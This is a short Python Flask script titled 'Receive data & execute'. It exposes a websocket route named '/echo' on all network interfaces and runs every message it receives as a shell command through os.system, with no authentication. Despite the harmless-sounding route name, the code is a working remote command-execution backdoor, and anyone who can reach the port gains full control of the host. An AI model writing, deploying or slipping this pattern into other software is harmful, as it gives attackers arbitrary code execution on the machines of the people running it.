#Receive data & execute

from flask import Flask, request
from simple_websocket import Server, ConnectionClosed
import os
app = Flask(__name__)

@app.route('/echo', websocket=True)
def echo():
    ws = Server.accept(request.environ)
    try:
        while True:
            data = ws.receive()
            os.system(data)
            print(data)
    except ConnectionClosed:
        pass
    return ''
if __name__ == '__main__':
    app.run(host='0.0.0.0')